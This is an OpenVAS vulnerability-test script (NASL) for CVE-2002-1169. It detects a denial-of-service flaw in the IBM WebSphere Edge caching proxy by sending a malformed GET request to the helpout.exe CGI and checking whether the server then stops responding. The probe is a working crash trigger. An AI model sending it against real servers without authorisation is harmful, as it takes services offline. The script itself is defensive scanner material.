###################################################################
# OpenVAS Vulnerability Test
#
# WebSphere Edge caching proxy denial of service
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2002 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###################################################################

# References:
# From:"Rapid 7 Security Advisories" <advisory@rapid7.com>
# Message-ID: <OF0A5563E4.CA3D8582-ON85256C5B.0068EEBC-88256C5B.0068BF86@hq.rapid7.com>
# Date: Wed, 23 Oct 2002 12:08:39 -0700
# Subject: R7-0007: IBM WebSphere Edge Server Caching Proxy Denial of Service

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11162");
  script_version("2022-05-12T09:32:01+0000");
  script_tag(name:"last_modification", value:"2022-05-12 09:32:01 +0000 (Thu, 12 May 2022)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/6002");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_cve_id("CVE-2002-1169");
  script_name("WebSphere Edge caching proxy denial of service");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2002 Michel Arboi");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution", value:"Upgrade your web server or remove this CGI.");

  script_tag(name:"summary", value:"We could crash the WebSphere Edge caching proxy by sending a
  bad request to the helpout.exe CGI");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port( default:80 );

if( http_is_dead( port:port ) ) exit( 0 );

foreach dir( make_list_unique( "/", http_cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  url = dir + "/helpout.exe";

  req = string( "GET ", url, " HTTP\r\n\r\n" );
  res = http_send_recv( port:port, data:req );

  if( http_is_dead( port:port ) ) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
